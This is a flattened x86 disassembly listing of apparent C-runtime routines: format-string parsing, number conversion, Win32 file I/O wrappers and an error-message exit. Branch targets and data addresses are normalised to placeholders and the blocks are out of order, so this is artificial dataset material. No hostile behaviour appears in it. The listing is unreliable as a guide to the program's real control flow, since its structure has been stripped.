inc ecx
test al al
mov [ ebp + 0x8 ] esi
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax ebx
jge r-xdata
mov [ ebp + 0x8 ] esi
inc esi
mov al [ esi ]
cmp al 0x2d
mov [ ebp + 0x8 ] esi
jne r-xdata
mov al [ esi ]
cmp al 0x68
je r-xdata
inc esi
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x17 ] ebx
jae r-xdata
inc esi
mov [ ebp - 0x1b ] eax
mov [ ebp + 0x8 ] esi
neg eax
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x20 ] 0x20
cmp al 0x2b
jne r-xdata
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x20 ] 0x20
jmp r-xdata
inc esi
mov [ ebp - 0x13 ] al
mov [ ebp + 0x8 ] esi
cmp al 0x6c
je r-xdata
cmp [ esi ] 0x2a
jne r-xdata
mov ecx [ ebp - 0x17 ]
imul ecx ecx 0xa
lea eax [ ecx + eax - 0x30 ]
inc esi
mov [ ebp - 0x17 ] eax
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jb r-xdata
cmp al 0x20
jne r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ebx
jmp r-xdata
test al al
jne r-xdata
pop edi
movzx eax cl
cmp eax 0x67
jg r-xdata
cmp al 0x4c
jne r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax ebx
jl r-xdata
mov [ ebp + 0x8 ] esi
cmp al 0x30
jne r-xdata
cmp [ ebp - 0x28 ] ebx
jne r-xdata
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
inc esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x17 ] eax
cmp al 0x23
jne r-xdata
cmp [ ebp - 0x2c ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
jmp r-xdata
push ebx
push 0x64
sub eax 0x5
je r-xdata
push [ ebp + 0xc ]
add edi 0x4
mov eax [ edi ]
mov [ ebp - 0xc ] eax
add edi 0x4
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
call sub_40fc86
pop ecx
jmp r-xdata
cmp eax 0x61
jg r-xdata
mov [ ebp - 0x1f ] ecx
mov [ ebp - 0x20 ] al
jmp r-xdata
xor ebx ebx
add edi 0x4
cmp [ ebp - 0x13 ] 0x68
mov eax [ edi ]
jne r-xdata
dec eax
je r-xdata
mov esi [ ebp + 0x8 ]
inc esi
cmp [ esi ] 0x0
mov [ ebp + 0x8 ] esi
jne r-xdata
sub eax 0x62
je r-xdata
je r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x1
push 0x6f
push 0x8
jmp r-xdata
dec eax
je r-xdata
push 0x1
push 0x62
push 0x2
jmp r-xdata
dec eax
je r-xdata
cmp eax 0x25
je r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov cx [ ecx + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ebp + 0xc ]
add edi 0x4
mov eax [ edi ]
lea esi [ ebp - 0x2c ]
call sub_40fa95
add esp 0x10
push 0x8
pop eax
push 0x1
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] 0x30
mov [ ebp - 0x1f ] ebx
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] 0x0
push 0x58
jmp r-xdata
sub eax 0x3
je r-xdata
add edi 0x4
movzx edx [ edi ]
dec eax
jne r-xdata
push 0x25
pop edx
jmp r-xdata
cmp eax 0x41
je r-xdata
push 0x10
jmp r-xdata
add edi 0x4
cmp [ ebp - 0x17 ] 0xffffffff
mov ebx [ edi ]
jne r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
call sub_40fa6d
jmp r-xdata
cmp eax 0x44
jle r-xdata
test ebx ebx
jne r-xdata
and [ ebp - 0x17 ] 0x0
push 0x1
push 0x75
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x47
jle r-xdata
push ebx
call sub_411738
pop ecx
mov ecx [ ebp - 0x17 ]
test ecx ecx
mov [ ebp - 0x4 ] eax
je r-xdata
mov ebx r--data
push 0xa
push 0x1
push ecx
cmp eax 0x58
je r-xdata
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp eax ecx
jbe r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
jbe r-xdata
mov eax [ ebp - 0x1b ]
cmp [ ebp - 0x4 ] eax
jae r-xdata
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x2c ] 0x0
je r-xdata
movsx edx [ ebx ]
mov eax [ ebp + 0xc ]
call sub_40fa6d
inc ebx
dec esi
jne r-xdata
mov esi eax
sub esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x1b ]
cmp [ ebp - 0x4 ] eax
jae r-xdata
movzx eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
sub eax [ ebp - 0x4 ]
mov ebx eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
call sub_40fa6d
dec esi
jne r-xdata
movzx esi [ ebp - 0x20 ]
mov eax [ ebp + 0xc ]
mov edx esi
call sub_40fa6d
dec ebx
jne r-xdata
jmp r-xdata
sub_410087
inc [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov edx [ ecx ]
movzx eax [ edx ]
test eax eax
je r-xdata
push [ ecx ]
call sub_410b7d
pop ecx
retn
or eax 0xffffffff
retn
inc edx
mov [ ecx ] edx
retn
sub_4100aa
dec [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0xffffffff
je r-xdata
push [ eax ]
push [ esp + 0x8 ]
call sub_411c95
pop ecx
pop ecx
retn
retn
dec [ eax ]
sub_4100cb
push ebp
mov ebp esp
sub esp 0x24
fldz
push ebx
push esi
fstp [ ebp - 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov ecx edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_410087
cmp eax 0x2b
je r-xdata
xor ecx ecx
cmp eax 0x2d
sete cl
mov [ ebp - 0x8 ] ecx
mov ecx edi
call sub_410087
mov esi [ ebp + 0xc ]
dec esi
jmp r-xdata
cmp eax 0x2d
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp + 0xc ]
mov ecx esi
dec esi
test ecx ecx
jne r-xdata
push eax
mov eax edi
call sub_4100aa
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi ebx
je r-xdata
push eax
mov eax edi
call sub_4100aa
pop ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2e
jne r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
cmp eax 0x65
je r-xdata
cmp esi ebx
je r-xdata
add eax 0xffffffd0
inc [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
mov ecx edi
fld [ ebp - 0x14 ]
fmul [ r--data ]
faddp st1
fstp [ ebp - 0x14 ]
call sub_410087
dec esi
jne r-xdata
cmp esi ebx
je r-xdata
cmp eax 0x45
jne r-xdata
push eax
mov eax edi
call sub_4100aa
cmp [ ebp - 0x4 ] 0x0
pop ecx
je r-xdata
fldz
fstp [ ebp - 0x1c ]
fld1
jmp r-xdata
fld [ r--data ]
mov ecx edi
fstp [ ebp - 0x24 ]
call sub_410087
dec esi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
fld [ ebp - 0x14 ]
je r-xdata
mov ecx edi
fstp [ ebp - 0x24 ]
call sub_410087
dec esi
jne r-xdata
cmp eax 0x2b
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
fchs
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
fld [ ebp - 0x1c ]
fdiv [ ebp - 0x24 ]
fadd [ ebp - 0x14 ]
fstp [ ebp - 0x14 ]
cmp eax 0x2d
jne r-xdata
cmp eax 0x2d
jne r-xdata
fstp st0
cmp [ ebp + 0x10 ] 0x3
je r-xdata
add eax 0xffffffd0
inc [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fld [ ebp - 0x1c ]
fld [ r--data ]
fmul st1
fxch st2
faddp st1
fstp [ ebp - 0x1c ]
fmul [ ebp - 0x24 ]
mov ecx edi
call sub_410087
dec esi
fld [ r--data ]
fstp [ ebp - 0x24 ]
test esi esi
je r-xdata
fstp [ eax ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x8
je r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
xor eax eax
inc eax
fstp [ eax ]
jmp r-xdata
test ebx ebx
je r-xdata
imul ebx ebx 0xa
mov ecx edi
lea ebx [ ebx + eax - 0x30 ]
call sub_410087
dec esi
jne r-xdata
fld [ ebp - 0x24 ]
sar ebx 0x1
fld st0
fmulp st1
jne r-xdata
fld [ ebp - 0x14 ]
fmul st1
fstp [ ebp - 0x14 ]
test bl 0x1
je r-xdata
fstp st0
sub_410288
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov ecx esi
xor ebx ebx
mov [ ebp - 0x4 ] edi
call sub_410087
cmp eax 0x2d
je r-xdata
xor ecx ecx
cmp eax 0x2d
sete cl
mov [ ebp - 0x4 ] ecx
mov ecx esi
call sub_410087
dec [ ebp + 0x10 ]
cmp eax 0x2b
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
mov eax esi
call sub_4100aa
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
push eax
mov eax esi
call sub_4100aa
test edi edi
pop ecx
jne r-xdata
dec [ ebp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
movzx ecx al
cmp ecx 0x61
jb r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
neg ebx
cmp ecx 0x41
jb r-xdata
sub ecx 0x20
xor eax eax
inc eax
mov ecx [ ebp + 0x14 ]
dec ecx
je r-xdata
add ecx 0xffffffd0
cmp ecx 0x9
ja r-xdata
sub ecx 0x37
jmp r-xdata
mov [ eax ] bx
dec ecx
je r-xdata
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov [ eax ] bl
jmp r-xdata
dec ecx
dec ecx
mov [ eax ] ebx
jne r-xdata
imul ebx [ ebp + 0xc ]
add ebx ecx
mov ecx esi
inc edi
call sub_410087
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
and [ eax + 0x4 ] ecx
jmp r-xdata
sub_41035b
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push edi
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
movzx eax [ esi ]
push eax
call sub_410f9a
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ esi ] 0x25
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_410f9a
test eax eax
pop ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
call sub_410087
mov ebx eax
movzx eax [ esi ]
cmp eax ebx
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x25
je r-xdata
mov ecx [ ebp + 0xc ]
call sub_410087
mov ebx eax
push ebx
call sub_410f9a
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_4100aa
mov eax [ ebp + 0x8 ]
test eax eax
pop ecx
jne r-xdata
inc esi
xor edi edi
mov esi eax
xor ebx ebx
cmp [ esi ] 0x2a
push 0x4
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
pop edx
jne r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_4100aa
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx 0xffffffff
jmp r-xdata
add [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov edi [ eax - 0x4 ]
mov [ ebp - 0x8 ] edi
inc esi
jmp r-xdata
jne r-xdata
or ebx 0xffffffff
mov [ ebp - 0xc ] ebx
imul ebx ebx 0xa
inc esi
lea ebx [ ebx + eax - 0x30 ]
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jb r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
jmp r-xdata
cmp [ esi ] 0x36
jne r-xdata
push 0x3
pop ecx
sub eax ecx
je r-xdata
test ebx ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec esi
cmp [ esi + 0x1 ] 0x34
jne r-xdata
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
sub eax 0x1c
je r-xdata
movzx eax [ esi ]
inc esi
sub eax 0x49
je r-xdata
cmp [ esi ] 0x6e
je r-xdata
cmp al 0x63
je r-xdata
inc esi
inc esi
mov al [ esi ]
cmp al 0x5b
je r-xdata
cmp [ esi ] 0x68
mov [ ebp - 0x4 ] 0x1
jne r-xdata
dec eax
dec eax
je r-xdata
mov ebx [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
call sub_410087
mov ebx eax
mov eax [ ebp + 0xc ]
push ebx
call sub_4100aa
cmp ebx 0xffffffff
pop ecx
je r-xdata
cmp al 0x6e
je r-xdata
inc esi
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
movzx eax [ esi ]
inc esi
cmp eax 0x67
jg r-xdata
mov ecx [ ebp + 0xc ]
call sub_410087
mov ebx eax
push ebx
call sub_410f9a
test eax eax
pop ecx
jne r-xdata
cmp [ esi ] 0x6c
mov [ ebp - 0x4 ] ecx
jne r-xdata
sub eax 0x8
je r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
push 0xa
sub eax 0x5
je r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
push [ ebp + 0xc ]
call sub_4100cb
add esp 0x10
jmp r-xdata
cmp eax 0x5b
jg r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_4100aa
cmp [ ebp + 0x8 ] 0x0
pop ecx
jne r-xdata
inc esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
jne r-xdata
test eax eax
je r-xdata
test edi edi
je r-xdata
dec eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
sub eax 0x61
je r-xdata
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] ecx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
dec eax
je r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
push 0x8
jmp r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
xor edi edi
cmp [ esi ] 0x5e
mov ebx esi
mov [ ebp - 0xc ] edi
jne r-xdata
cmp eax 0x41
je r-xdata
inc [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x8 ]
mov [ edi ] ax
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
call sub_410288
add esp 0x14
push edi
push 0x0
push 0x8
jmp r-xdata
sub eax 0x3
je r-xdata
cmp ebx 0xffffffff
jne r-xdata
dec eax
jne r-xdata
cmp [ esi ] 0x5d
jne r-xdata
lea ebx [ esi + 0x1 ]
inc edi
mov esi ebx
cmp eax 0x44
jle r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax + 0x8 ]
mov [ edi ] al
jmp r-xdata
dec eax
dec eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
mov [ edi ] eax
jne r-xdata
push 0x10
jmp r-xdata
test ebx ebx
je r-xdata
dec eax
dec eax
je r-xdata
test ebx ebx
jne r-xdata
xor ebx ebx
inc ebx
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
jmp r-xdata
cmp eax 0x47
jle r-xdata
and [ edi + 0x4 ] 0x0
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp + 0xc ]
dec [ ebp - 0xc ]
call sub_410087
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub eax 0x3
mov ecx [ ebp + 0xc ]
dec ebx
call sub_410087
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp al 0x5d
je r-xdata
jmp r-xdata
inc esi
cmp eax 0x58
jmp r-xdata
mov [ edi ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_4100aa
pop ecx
push ebx
call sub_410f9a
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
mov eax [ ebp + 0xc ]
push 0xffffffff
call sub_4100aa
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp + 0xc ]
call sub_410087
cmp eax 0xffffffff
jne r-xdata
jne r-xdata
test edi edi
je r-xdata
mov [ edi ] al
inc edi
cmp ebx esi
mov ecx ebx
jae r-xdata
push eax
mov eax [ ebp + 0xc ]
call sub_4100aa
cmp [ esi ] 0x5d
pop ecx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ edi ] bl
inc edi
test edi edi
je r-xdata
movzx edx [ ecx ]
cmp eax edx
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc esi
jmp r-xdata
cmp ecx esi
je r-xdata
cmp ecx esi
jne r-xdata
inc ecx
cmp ecx esi
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov edi eax
jmp r-xdata
inc [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
sub_4107ab
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
push esi
add ecx 0x76c
push ecx
push [ eax ]
mov ecx [ eax + 0x10 ]
push [ eax + 0x4 ]
lea ecx [ ecx * 4 + r--data ]
push [ eax + 0x8 ]
mov esi rw-data
push [ eax + 0xc ]
mov eax [ eax + 0x18 ]
push ecx
lea eax [ eax * 4 + r--data ]
push eax
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x24
mov eax esi
pop esi
retn
sub_410819
push ebp
mov ebp esp
sub esp 0x400
push [ ebp + 0x10 ]
lea eax [ ebp - 0x400 ]
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x18
push 0x10
push r--data
lea eax [ ebp - 0x400 ]
push eax
push 0x0
call [ MessageBoxA@IAT ]
push 0xffffffff
call [ ExitProcess@IAT ]
sub_410901
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x10 ]
dec edi
imul edi ebx
add edi eax
test ebx ebx
mov [ ebp + 0xc ] eax
jne r-xdata
cmp eax edi
push esi
ja r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0xc ]
xor edx edx
div ebx
mov esi eax
shr esi 0x1
imul esi ebx
add esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call [ ebp + 0x18 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
jge r-xdata
add esi ebx
mov [ ebp + 0xc ] esi
jmp r-xdata
mov eax esi
jmp r-xdata
sub esi ebx
mov edi esi
cmp [ ebp + 0xc ] edi
jbe r-xdata
pop esi
sub_410986
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
and ah 0xf3
or ah 0x8
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_4109cc
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
faddp st1
fld [ r--data ]
fdivp st1
retn
sub_4109d2
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
faddp st1
fld [ r--data ]
fdivp st1
retn
sub_4109fd
push esi
push 0x1000
call sub_411051
mov esi eax
test esi esi
pop ecx
je r-xdata
mov eax esi
pop esi
retn
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
push esi
call sub_411d61
add esp 0xc
sub_410a25
push esi
push edi
push 0x1000
call sub_411051
mov esi [ esp + 0x1c ]
test esi esi
mov edi eax
pop ecx
mov eax esi
jne r-xdata
push eax
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push r--data
push edi
call sub_4115cd
add esp 0x18
test esi esi
je r-xdata
mov eax r--data
push edi
call [ OutputDebugStringA@IAT ]
push edi
call sub_410d3e
pop ecx
pop edi
pop esi
retn
push esi
call sub_410d3e
pop ecx
sub_410aae
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
leave
retn
sub_410b53
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
push eax
call sub_410d3e
cmp esi 0xffffffff
pop ecx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
pop esi
retn
xor eax eax
pop esi
retn
sub_410b7d
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0xffffffff
je r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0xb ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ eax + 0x4 ]
or [ eax + 0x4 ] 0xffffffff
movzx eax cl
leave
retn
or eax 0xffffffff
leave
retn
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
movzx eax [ ebp + 0xb ]
leave
retn
sub_410bbf
push esi
mov esi [ esp + 0xc ]
push 0x1
lea eax [ esi + 0x4 ]
and [ eax ] 0x0
push eax
mov eax [ esp + 0x10 ]
push 0x0
push [ eax ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
pop esi
jne r-xdata
xor eax eax
retn
call [ GetLastError@IAT ]
neg eax
sbb eax eax
neg eax
retn
sub_410bf3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jg r-xdata
push [ ebp + 0x10 ]
call sub_410b7d
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] 0x0
xor eax eax
jmp r-xdata
mov [ esi ] al
inc esi
cmp eax 0xa
je r-xdata
pop esi
pop ebp
retn
dec [ ebp + 0xc ]
sub_410c32
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
and ah 0xf3
or ah 0x4
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_410c5f
push ebp
mov ebp esp
mov eax 0x19000
call sub_40f8bc
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x19000 ]
push eax
mov [ ebp - 0x19000 ] 0x0
call [ wvsprintfA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x19000 ]
push eax
call sub_410cd0
pop ecx
pop ecx
leave
retn
sub_410c9a
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov [ ebp + 0xb ] bl
call [ WriteFile@IAT ]
test eax eax
je r-xdata
or eax 0xffffffff
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov eax ebx
jmp r-xdata
pop ebx
leave
retn
sub_410cd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor ecx ecx
xor esi esi
cmp [ eax ] cl
je r-xdata
push ecx
lea ecx [ ebp + 0x8 ]
push ecx
push esi
push eax
mov eax [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
inc esi
cmp [ esi + eax ] cl
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax esi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
or eax 0xffffffff
sub_410d0d
push ebp
mov ebp esp
push 0x0
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
xor edx edx
div [ ebp + 0xc ]
pop ebp
retn
sub_410d51
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push 0x8
call sub_411051
mov esi eax
cmp esi edi
pop ecx
jne r-xdata
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
or [ esi ] 0xffffffff
or [ esi + 0x4 ] 0xffffffff
push ebx
mov ebx [ esp + 0x14 ]
mov al [ ebx ]
cmp al 0x61
mov edx 0xc0000000
je r-xdata
xor eax eax
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax edx
push 0x4
cmp al 0x72
je r-xdata
pop edi
pop esi
retn
push edi
push edi
push ecx
push edi
push 0x3
push eax
push [ esp + 0x28 ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax edx
mov eax 0x80000000
push 0x3
jmp r-xdata
cmp al 0x77
jne r-xdata
cmp [ ebx ] 0x61
jne r-xdata
push esi
call sub_410d3e
pop ecx
xor eax eax
jmp r-xdata
cmp [ ebx + 0x1 ] 0x2b
pop ecx
jne r-xdata
mov eax 0x40000000
push 0x2
jmp r-xdata
mov [ esi ] edi
mov eax esi
push 0x2
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
pop ebx
sub_410df8
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x1
call sub_41035b
add esp 0xc
leave
retn
sub_410e41
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push [ eax ]
mov [ ebp - 0x8 ] ecx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
xor eax eax
leave
retn
call [ GetLastError@IAT ]
neg eax
sbb eax eax
neg eax
leave
retn
sub_410e93
push ebp
mov ebp esp
push 0x0
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
xor edx edx
div [ ebp + 0xc ]
pop ebp
retn
sub_410ec4
push esi
push edi
mov esi 0x400
push esi
mov edi rw-data
push edi
push [ esp + 0x14 ]
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
xor eax eax
cmp eax esi
ja r-xdata
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_410eed
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi rw-data
jmp r-xdata
push edi
call sub_410b7d
cmp eax 0xffffffff
pop ecx
jne r-xdata
cmp eax 0xa
je r-xdata
xor eax eax
mov eax [ esp + 0xc ]
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] al
inc esi
pop edi
pop esi
retn
sub_410f1c
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x1a
jb r-xdata
xor eax eax
inc eax
retn
lea ecx [ eax - 0x41 ]
cmp ecx 0x1a
jb r-xdata
add eax 0xffffffd0
cmp eax 0xa
jb r-xdata
xor eax eax
retn
sub_410f6f
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x21 ]
cmp ecx 0xf
